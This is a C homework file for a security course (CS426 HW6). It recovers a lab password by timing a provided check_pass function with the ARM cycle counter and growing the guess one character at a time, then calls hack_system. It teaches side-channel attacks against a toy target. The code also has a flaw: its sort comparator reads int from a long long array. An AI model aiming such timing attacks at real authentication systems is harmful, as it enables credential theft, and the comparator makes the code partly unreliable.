/*******************************************************
 CS426 HW6
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CS426 Password guesser using timing

 *******************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>

// include our "system" header
#include "sysapp.h"

#define LOWER_A_ASCII 97
#define LOWER_Z_ASCII 122
#define UPPER_A_ASCII 65
#define UPPER_Z_ASCII 90
#define ZERO_ASCII 48
#define NINE_ASCII 57
#define MAX_PASSWORD_LENGTH 16
#define NUM_MEASUREMENTS 64
#define DELTA_TIME_THRESHOLD 4

// Read cycle counter
static inline unsigned long long read_cntvct(void) {
	unsigned long long cntvct;
	asm volatile("mrs %0, cntvct_el0" : "=r" (cntvct));
	return cntvct;
}

int compare(const void* a, const void* b) {
    return *(int*)a - *(int*)b;
}

int main(int argc, char **argv) {
    char guess[33];

    // set guess to zeros
    bzero(guess, sizeof(guess));

    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //   and looking for time deviations

    int lower_bounds[] = {UPPER_A_ASCII, LOWER_A_ASCII, ZERO_ASCII};
    int upper_bounds[] = {UPPER_Z_ASCII, LOWER_Z_ASCII, NINE_ASCII};
 
    long long prev_cycles = 5;
    for (int n = 1; n <= MAX_PASSWORD_LENGTH; n++) {
        bool found = false;
        for (int idx = 0; idx < sizeof(lower_bounds) / sizeof(lower_bounds[0]); idx++) {
            for (int c = lower_bounds[idx]; c <= upper_bounds[idx]; c++) {
                guess[n - 1] = c;

		// perform a series of cycle measurements
		long long measurements[NUM_MEASUREMENTS];
		for (int idx = 0; idx < NUM_MEASUREMENTS; idx++) {
		    long long before = read_cntvct();
	            check_pass(guess);
		    long long after = read_cntvct();
		    measurements[idx] = after - before;
		}

		// check if the median of the cycle measurements increased by a sufficient amount
		qsort(measurements, NUM_MEASUREMENTS, sizeof(long long), compare);
                if (measurements[NUM_MEASUREMENTS / 2] - prev_cycles > DELTA_TIME_THRESHOLD) {
		    found = true;
		    prev_cycles = measurements[NUM_MEASUREMENTS / 2];
		    break;
		}
	    }
	    // stop other character checks if we found the correct character
            if (found) break;
        }

	// null-terminate the guess and exit if we reached the entirety of the password.
        if (!found) {
	    guess[n - 1] = 0;
	    break;
	}
    }

    if (check_pass(guess)) {
        printf("Password Found!\n");
        hack_system(guess);
    };

    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
